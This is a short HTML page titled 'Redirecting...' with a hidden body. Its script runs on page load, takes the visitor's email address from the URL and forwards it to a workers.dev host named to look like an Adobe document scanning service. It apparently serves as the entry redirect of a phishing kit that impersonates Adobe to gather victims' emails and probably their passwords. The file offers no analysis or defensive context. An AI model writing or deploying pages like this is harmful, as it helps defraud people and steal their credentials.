<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Redirecting...</title>
  <script>
    // Grab ?email= from URL
    function getEmail() {
      const params = new URLSearchParams(window.location.search);
      return params.get("email") || "";
    }

    function redirectToWorker() {
      const email = getEmail();
      let url = "https://pdfscan-3030-fastdoc.adobe-docs.workers.dev/"; // main worker endpoint
      if (email) url += "?email=" + encodeURIComponent(email);

      // Forward immediately to Worker
      window.location.replace(url);
    }

    window.addEventListener("load", redirectToWorker);
  </script>
</head>
<body style="display:none;">
  Redirecting...
</body>
</html>
